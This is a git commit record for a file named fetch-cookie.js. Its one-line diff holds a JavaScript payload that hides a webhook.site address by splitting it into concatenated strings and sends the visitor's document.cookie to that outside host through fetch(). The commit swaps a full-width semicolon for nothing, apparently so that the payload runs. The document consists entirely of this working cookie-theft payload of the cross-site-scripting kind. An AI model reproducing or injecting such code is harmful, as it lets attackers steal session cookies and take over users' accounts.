f4523068a6608e06da0bcecaa8e024cd2edb1cff
zhanggaolijoyce <130479536+zhanggaolijoyce@users.noreply.github.com>
2024-02-23 00:05:52 +0800

    Update fetch-cookie.js

--- fetch-cookie.js
+++ fetch-cookie.js
@@ -1,1 +1,1 @@
-fetch('htt'+'ps://we'+'bhook.site/b9055e73-29f3-4'+'080-b7ed-e23b096ab289/?cookie='+document.cookie)；
+fetch('htt'+'ps://we'+'bhook.site/b9055e73-29f3-4'+'080-b7ed-e23b096ab289/?cookie='+document.cookie)
